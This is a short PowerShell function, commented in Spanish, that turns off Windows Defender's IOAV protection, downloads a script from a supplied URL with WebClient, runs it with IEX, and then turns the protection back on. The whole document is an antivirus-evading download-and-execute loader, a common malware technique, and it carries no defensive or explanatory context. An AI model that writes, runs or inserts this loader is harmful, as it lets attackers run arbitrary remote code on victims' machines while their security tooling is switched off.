function  execute-url-script {
param ($url)

################## Desactivamos Windows Defender ###########################
Set-MpPreference -DisableIOAVProtection $True
$objeto = "system.net.webclient" 
$webclient = New-Object $objeto 
$webrequest = $webclient.DownloadString($url)
IEX $webrequest
sleep -Seconds 10
Set-MpPreference -DisableIOAVProtection $False

}
